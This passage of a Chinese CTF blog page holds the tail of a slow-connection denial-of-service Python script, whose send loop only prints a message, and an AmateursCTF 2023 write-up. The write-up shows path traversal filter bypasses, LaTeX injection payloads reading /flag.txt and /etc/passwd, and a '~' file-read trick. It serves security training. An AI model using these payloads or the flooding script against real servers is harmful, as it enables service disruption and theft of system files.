bag<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">"POST %s HTTP/1.1\r\n"</span>
    <span class="token string">"host: %s\r\n"</span>
    <span class="token string">"Content-Length: 1000000000\r\n"</span>
    <span class="token string">"Cookie: 1998\r\n"</span>
    <span class="token string">"\r\n"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>page<span class="token punctuation">,</span>host<span class="token punctuation">)</span><span class="token punctuation">)</span>

socks <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>

<span class="token keyword">def</span> <span class="token function">connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">global</span> socks
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">max</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span>socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span>port<span class="token punctuation">)</span><span class="token punctuation">)</span>
            s<span class="token punctuation">.</span>send<span class="token punctuation">(</span>bag<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            socks<span class="token punctuation">.</span>append<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> ex<span class="token punctuation">:</span>
            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">global</span> socks
    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> s <span class="token keyword">in</span> socks<span class="token punctuation">:</span>
            <span class="token keyword">try</span><span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"攻击中...."</span><span class="token punctuation">)</span>
            <span class="token keyword">except</span> Exception <span class="token keyword">as</span> ex<span class="token punctuation">:</span>
                socks<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
                s<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>

One <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>connect<span class="token punctuation">,</span>args<span class="token operator">=</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
Two <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>send<span class="token punctuation">,</span>args<span class="token operator">=</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
One<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>
Two<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/AWD/" rel="tag">AWD</a></li></ul>

    </footer>
  </div>

   
   
  
</article>

    
    <article
  id="post-AmateursCTF-2023wp"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2023/07/22/AmateursCTF-2023wp/"
    >AmateursCTF 2023wp</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2023/07/22/AmateursCTF-2023wp/" class="article-date">
  <time datetime="2023-07-22T05:18:32.000Z" itemprop="datePublished">2023-07-22</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E8%B5%9B%E4%BA%8Bwp/">赛事wp</a>
  </div>
   
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <meta name="referrer" content="no-referrer"/>



<p><img src="https://img-blog.csdnimg.cn/a940c784ee9a4fe2a043298e02b63070.png" alt="1"></p>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>虽然说这个比赛是针对于美国高中生的，可是也不是很简单，美国高中生这么D吗，该努力了 :sob:</p>
<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="waiting-an-eternity"><a href="#waiting-an-eternity" class="headerlink" title="waiting-an-eternity"></a>waiting-an-eternity</h3><blockquote>
<p>我的朋友给我发了这个网站，并说如果我等得足够长，我就可以得到并举报！并不是说我需要一面旗帜或任何东西，但我已经等了几天了，它仍然要求我等待。我有点不耐烦了，你能帮我拿旗子吗？</p>
</blockquote>
<p>抓包得到线索：<br><img src="https://img-blog.csdnimg.cn/fe692516b6d34fd1a7d34a9ef06f5ac3.png" alt="1"><br>访问后发现每刷新一次&#x3D;&#x3D;set-cookie&#x3D;&#x3D;就会变一次，它跟时间也有一些关系。<br><img src="https://img-blog.csdnimg.cn/d81d9bdd78184662817b7438e9768d5d.png" alt="2"><br>那么我们添加一个cookie值<br><img src="https://img-blog.csdnimg.cn/4913065b3b7b455ba1e53e5bda386c75.png" alt="3"><br>经过几次测试，当time为负数且足够小时就会出现flag。<br><img src="https://img-blog.csdnimg.cn/4ea4d69f2e8547b49ed15020b7e5b1f0.png" alt="3"><br>这里时间的表示你可以正常表示，也可以使用科学计数法，也可以使用&#x3D;&#x3D;-inf&#x2F;-Infinity&#x3D;&#x3D;来表示无穷小。</p>
<h3 id="funny-factorials"><a href="#funny-factorials" class="headerlink" title="funny factorials"></a>funny factorials</h3><blockquote>
<p>我制作了一个阶乘应用程序！它是如此的奇特和迷人。然而，阶乘似乎无法正确计算大数！你能帮我解决它吗？</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/3fdd0c83d0df415aa50ec3172aa80238.png" alt="1"></p>
<p>分析数据包可以猜测在切换主题的数据包中有疑似文件读取漏洞。<code>/?theme=themes/theme1.css</code>，题目给的还有附件<br>app.py文件</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> request
<span class="token keyword">import</span> sys

app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">factorial</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> n <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token number">1</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> n <span class="token operator">*</span> factorial<span class="token punctuation">(</span>n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>
        <span class="token keyword">except</span> RecursionError<span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token number">1</span>

<span class="token keyword">def</span> <span class="token function">filter_path</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># print(path)</span>
    path <span class="token operator">=</span> path<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"../"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> filter_path<span class="token punctuation">(</span>path<span class="token punctuation">)</span>
    <span class="token keyword">except</span> RecursionError<span class="token punctuation">:</span>
        <span class="token comment"># remove root / from path if it exists</span>
        <span class="token keyword">if</span> path<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"/"</span><span class="token punctuation">:</span>
            path <span class="token operator">=</span> path<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span>
        <span class="token keyword">return</span> path

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    safe_theme <span class="token operator">=</span> filter_path<span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"theme"</span><span class="token punctuation">,</span> <span class="token string">"themes/theme1.css"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>safe_theme<span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span>
    theme <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
    f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span> css<span class="token operator">=</span>theme<span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">calculate_factorial</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    safe_theme <span class="token operator">=</span> filter_path<span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"theme"</span><span class="token punctuation">,</span> <span class="token string">"themes/theme1.css"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

    f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>safe_theme<span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span>
    theme <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
    f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        num <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'number'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> num <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">:</span>
            error <span class="token operator">=</span> <span class="token string">"Invalid input: Please enter a non-negative integer."</span>
            <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span> error<span class="token operator">=</span>error<span class="token punctuation">,</span> css<span class="token operator">=</span>theme<span class="token punctuation">)</span>
        result <span class="token operator">=</span> factorial<span class="token punctuation">(</span>num<span class="token punctuation">)</span>
        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span> result<span class="token operator">=</span>result<span class="token punctuation">,</span> css<span class="token operator">=</span>theme<span class="token punctuation">)</span>
    <span class="token keyword">except</span> ValueError<span class="token punctuation">:</span>
        error <span class="token operator">=</span> <span class="token string">"Invalid input: Please enter a non-negative integer."</span>
        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span> error<span class="token operator">=</span>error<span class="token punctuation">,</span> css<span class="token operator">=</span>theme<span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    sys<span class="token punctuation">.</span>setrecursionlimit<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>dockerfile文件</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">FROM python:3.10-slim-buster

RUN pip3 <span class="token function">install</span> flask
COPY flag.txt /

WORKDIR /app
COPY app/* /app/
copy app/templates/* /app/templates/
copy app/themes/* /app/themes/

EXPOSE <span class="token number">5000</span>

ENTRYPOINT <span class="token punctuation">[</span><span class="token string">"python3"</span>, <span class="token string">"app.py"</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>可以得知flag文件名为flag.txt，<code>path = path.replace(&quot;../&quot;, &quot;&quot;)</code>这里把<code>../</code>也给过滤了<br>绕过的话我试了试发现<code>//flag.txt和..///flag.txt</code>都可以绕过<br><img src="https://img-blog.csdnimg.cn/0f66898d59574faf8b13befd85b71cee.png" alt="1"></p>
<h3 id="latek"><a href="#latek" class="headerlink" title="latek"></a>latek</h3><blockquote>
<p>bryanguo（与ctf无关）一直说它的发音是latek，而不是像手套材料那样的乳胶。不管怎样，我制作了这个简单的应用程序，这样他就不再支付背页的费用了。<br>注意：标志仅在&#x2F;flag.txt</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/3730939722a3412fb00a4fd24179ee9c.png" alt="1"><br>这个就是一个在线的LaTex编辑器，将编辑的内容以pdf的文件形式展现出来，查看了一篇<a target="_blank" rel="noopener" href="https://salmonsec.com/cheatsheets/exploitation/latex_injection">国外大佬的博客</a>，介绍了LaTex注入的一些语法。</p>
<p>输入</p>
<blockquote>
<p>\documentclass{article}<br>\begin{document}<br>Hello, world!<br>\input{&#x2F;flag.txt}<br>\end{document} </p>
</blockquote>
<p>会发现给出了一部分flag<br><img src="https://img-blog.csdnimg.cn/fbb8040055734064a248c8036fd23c2c.png" alt="1"><br>那么另一部分怎么得到呢？借鉴了wp看到他使用了批处理模式</p>
<blockquote>
<p>\batchmode：在 LaTeX 中，该命令会抑制所有终端和日志文件输出，这意味着编译过程不会在终端上产生任何消息或提示。它通常用于以批处理模式运行 LaTeX，在处理文档时不会中断用户输入或反馈。当您想要自动化文档生成过程时，这会很有帮助</p>
</blockquote>
<blockquote>
<p>\documentclass{article}<br>\begin{document}<br>Hello, world!<br>\batchmode<br>\input{&#x2F;flag.txt}<br>\end{document} </p>
</blockquote>
<blockquote>
<p>\documentclass{article}<br>\begin{document}<br>Hello, world!<br>\usepackage{verbatim}<br>\verbatiminput{&#x2F;etc&#x2F;passwd}<br>\end{document} </p>
</blockquote>
<blockquote>
<p>在LaTeX文档中，\usepackage{verbatim}用于导入名为”verbatim”的宏包，它提供了在文档中插入原始文本（verbatim文本）的功能。当你希望在文档中原样显示一段代码、配置文件或其他任何文本时，通常会使用该宏包。</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/af8f210f009944a088f99b6809eb579f.png" alt="1"><br>参考链接<br><a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LaTeX%20Injection">链接</a><br><a target="_blank" rel="noopener" href="https://salmonsec.com/cheatsheets/exploitation/latex_injection">链接</a></p>
<h3 id="uwuctf"><a href="#uwuctf" class="headerlink" title="uwuctf"></a>uwuctf</h3><blockquote>
<p>这个 rust uwuifier 速度太快了，我确信只要我能欺骗我的节点，它就会扩展到月球。uwuifier 即服务专业版何时订阅？<br>更新：zip 几乎与服务器相同，除了我们删除了challenge.yml 和flag.txt</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/ef485e2862cb42e8883d69eae95ea0a5.png" alt="1"><br>这里就是访问上面的文件当我利用LFI漏洞时发现<code>../</code>被过滤了。后续测试了很多遍也没有思路。最后看见别人的wp结合源码<br>这是index.js文件</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">
<span class="token keyword">import</span> <span class="token punctuation">&#123;</span>config<span class="token punctuation">&#125;</span> <span class="token keyword">from</span> <span class="token string">"dotenv"</span><span class="token punctuation">;</span>
<span class="token function">config</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> fs <span class="token keyword">from</span> <span class="token string">"fs"</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> path <span class="token keyword">from</span> <span class="token string">"path"</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token punctuation">&#123;</span>quote<span class="token punctuation">&#125;</span> <span class="token keyword">from</span> <span class="token string">"shell-quote"</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">&#123;</span>exec<span class="token punctuation">&#125;</span> <span class="token keyword">from</span> <span class="token string">"child_process"</span><span class="token punctuation">;</span>

<span class="token keyword">const</span> textsDir <span class="token operator">=</span> path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>process<span class="token punctuation">.</span><span class="token function">cwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"public"</span><span class="token punctuation">,</span> <span class="token string">"texts"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> uwuifierPath <span class="token operator">=</span> path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>process<span class="token punctuation">.</span><span class="token function">cwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"uwuify"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> express <span class="token keyword">from</span> <span class="token string">"express"</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> morgan <span class="token keyword">from</span> <span class="token string">"morgan"</span><span class="token punctuation">;</span>
app<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'trust proxy'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'loopback'</span><span class="token punctuation">,</span> <span class="token string">'linklocal'</span><span class="token punctuation">,</span> <span class="token string">'uniquelocal'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token function">morgan</span><span class="token punctuation">(</span><span class="token string">"combined"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
  res<span class="token punctuation">.</span><span class="token function">sendFile</span><span class="token punctuation">(</span><span class="token string">"public/index.html"</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>
    <span class="token literal-property property">root</span><span class="token operator">:</span> process<span class="token punctuation">.</span><span class="token function">cwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">// bug fix</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>


app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"/uwuify"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
  res<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">"txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>src<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>src<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">".."</span><span class="token punctuation">)</span> <span class="token operator">||</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>src<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">"./"</span><span class="token punctuation">)</span> <span class="token operator">||</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>src<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span> <span class="token operator">||</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>src<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"-"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
      res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"no hacking >:("</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">return</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">let</span> cmd <span class="token operator">=</span> <span class="token string">"cat "</span> <span class="token operator">+</span> <span class="token function">quote</span><span class="token punctuation">(</span><span class="token punctuation">[</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>src<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" | "</span> <span class="token operator">+</span> uwuifierPath<span class="token punctuation">;</span>
    <span class="token function">exec</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>
      <span class="token literal-property property">cwd</span><span class="token operator">:</span> textsDir
    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span> stdout<span class="token punctuation">,</span> stderr</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
      res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>stdout <span class="token operator">+</span> stderr<span class="token punctuation">)</span><span class="token punctuation">;</span>
      res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"no src provided"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"/dir"</span><span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    res<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">"txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> output <span class="token operator">=</span> <span class="token string">"texts avali to uwuify: "</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> files <span class="token operator">=</span> <span class="token keyword">await</span> fs<span class="token punctuation">.</span>promises<span class="token punctuation">.</span><span class="token function">readdir</span><span class="token punctuation">(</span>textsDir<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> file <span class="token keyword">of</span> files<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        output <span class="token operator">+=</span> <span class="token string">"\r\n"</span> <span class="token operator">+</span> file<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    output <span class="token operator">+=</span> <span class="token string">"\r\n\r\nUse /uwuify?src=&lt;text file name> to uwuify a text file!"</span><span class="token punctuation">;</span>
    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

app<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span>process<span class="token punctuation">.</span>env<span class="token punctuation">.</span><span class="token constant">PORT</span> <span class="token operator">||</span> <span class="token number">3000</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"Server Up!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这是dockerfile文件</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">FROM node:16
COPY ./* /home/node/app/
COPY ./public/* /home/node/app/public/
COPY ./public/texts/* /home/node/app/public/texts/
WORKDIR /home/node/app
RUN <span class="token function">npm</span> <span class="token function">install</span>
ENV <span class="token assign-left variable">PORT</span><span class="token operator">=</span><span class="token number">8082</span>
RUN <span class="token function">chown</span> <span class="token parameter variable">-R</span> node:node /home/node/app
<span class="token environment constant">USER</span> <span class="token function">node</span>
CMD <span class="token punctuation">[</span><span class="token string">"bash"</span>, <span class="token string">"launch.sh"</span><span class="token punctuation">]</span>
EXPOSE <span class="token number">8082</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>可以看到实际上flag.txt就在&#x2F;home&#x2F;node&#x2F;app&#x2F;flag.txt<br>读取当前目录使用<code>~</code>，其实<code>https://uwuasaservice.amt.rs/uwuify?src=~</code>也就是<code>cat ~</code>，这个时候爆出路径</p>
<blockquote>
<p>cat: &#x2F;home&#x2F;node: Is a directory</p>
</blockquote>
<p>那么下面就直接读取flag文件<br><a target="_blank" rel="noopener" href="https://uwuasaservice.amt.rs/uwuify?src=~/app/flag.txt">https://uwuasaservice.amt.rs/uwuify?src=~/app/flag.txt</a></p>
<blockquote>
<p>amateuwsctf{so_wmao_this_fwag_is_gonna_be_a_wot_wongew_than_most_fwag_othew_fwags_good_wuck_have_fun_decoding_it_end_of_fwag}</p>
</blockquote>
 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li></ul>

    </footer>
  </div>

   
   
  
</article>

    
    <article
  id="post-涉及SSRF的一些tricks"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2023/07/20/%E6%B6%89%E5%8F%8ASSRF%E7%9A%84%E4%B8%80%E4%BA%9Btricks/"
    >涉及SSRF的一些tricks</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2023/07/20/%E6%B6%89%E5%8F%8ASSRF%E7%9A%84%E4%B8%80%E4%BA%9Btricks/" class="article-date">
  <time datetime="2023-07-20T09:43:52.000Z" itemprop="datePublished">2023-07-20</time>
</a> 
  <div class="article-category">
